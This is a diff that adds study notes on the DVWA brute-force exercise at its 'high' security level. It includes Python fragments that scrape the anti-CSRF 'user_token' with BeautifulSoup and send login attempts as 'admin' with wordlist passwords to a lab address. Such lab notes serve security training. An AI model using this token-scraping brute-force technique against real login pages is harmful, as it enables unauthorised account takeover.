@@ -59,7 +59,21 @@
            * that means, the Request Url will contains a 'user_token' by sending to Server. 
 	     And the Sever checks the recieved token firstly, if token is valid, then the Server 
              operates the Sql queries.
-               
+	     
+   * To achieve the goal at high security level, we need to write a phython script to brute force the password.
+   
+   	* sending request to server to get response
+	
+			req = urllib.request.Request(url=requrl,headers=header)
+		
+* for getting ' user_token ' , we need to use BeautifulSoup package to read the reponse content, and parser the page to get 'token'
+	  
+		  soup = BeautifulSoup(the_page,"html.parser")
+		  user_token = soup.find('input',{'name':'user_token'})['value']
+	   
+	   
+                * by sending request to the server with following URL, which including the param 'user_token' additional
+	   	 ' requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token '
       
       
            
